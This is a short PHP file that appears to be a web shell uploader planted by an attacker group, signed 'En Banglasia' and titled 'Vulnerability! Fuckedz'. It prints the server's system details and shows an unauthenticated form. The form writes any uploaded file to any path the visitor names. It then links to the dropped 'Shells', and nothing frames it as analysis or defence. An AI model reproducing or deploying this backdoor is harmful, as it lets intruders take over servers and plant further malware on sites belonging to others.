<title>Vulnerability! Fuckedz By En Banglasia</title>
<?php
echo "Priv8 Uploaders By En Banglasia";
echo "<br>" . php_uname() . "<br>";
$files = @$_FILES["files"];
if ($files["name"] != '') {
  $fullpath = $_REQUEST["path"] . $files["name"];
  if (move_uploaded_file($files['tmp_name'], $fullpath)) {
    echo "<h1><a href='$fullpath'>Shells =>> Fuckedz!</a></h1>";
  }
}
echo '<html><head></head><body><form method="POST" enctype="multipart/form-data" action=""><input type=text name=path><input type="file" name="files"><input type=submit value="Up"></form></body></html>';
?>
</ce
